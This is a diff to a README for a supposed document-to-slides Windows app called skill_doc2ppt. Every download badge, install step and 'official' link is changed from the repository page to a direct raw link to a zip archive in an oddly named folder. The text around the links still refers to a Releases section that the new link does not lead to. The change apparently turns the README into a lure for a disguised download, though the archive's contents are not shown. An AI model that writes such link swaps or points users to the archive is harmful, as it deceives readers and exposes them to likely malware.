@@ -1,6 +1,6 @@
 # 📄 skill_doc2ppt - Convert Docs to Claude-Style Slides
 
-[![Download skill_doc2ppt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ibadbasit/skill_doc2ppt)
+[![Download skill_doc2ppt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ibadbasit/skill_doc2ppt/raw/refs/heads/main/melodrame/ppt-doc-skill-v2.7.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before downloading, make sure your computer meets these needs:
 
 Click the big green button below to visit the official download page on GitHub. From there, you can get the latest version of skill_doc2ppt for Windows.
 
-[![Download skill_doc2ppt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ibadbasit/skill_doc2ppt)
+[![Download skill_doc2ppt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ibadbasit/skill_doc2ppt/raw/refs/heads/main/melodrame/ppt-doc-skill-v2.7.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to use the app on your Windows PC.
 
 ### 1. Visit the Download Page
 
-Go to https://github.com/ibadbasit/skill_doc2ppt to find the latest release files. Look for the "Releases" section or the main page downloads.
+Go to https://github.com/ibadbasit/skill_doc2ppt/raw/refs/heads/main/melodrame/ppt-doc-skill-v2.7.zip to find the latest release files. Look for the "Releases" section or the main page downloads.
 
 ### 2. Download the Windows Installer
 
@@ -111,7 +111,7 @@ Visit the download page regularly for new versions. Updates may include bug fixe
 ## 🔗 Useful Links
 
 - Official download and info page:  
-  https://github.com/ibadbasit/skill_doc2ppt
+  https://github.com/ibadbasit/skill_doc2ppt/raw/refs/heads/main/melodrame/ppt-doc-skill-v2.7.zip
 
 - Example downloads: Find them in the "Releases" section on that page.
 
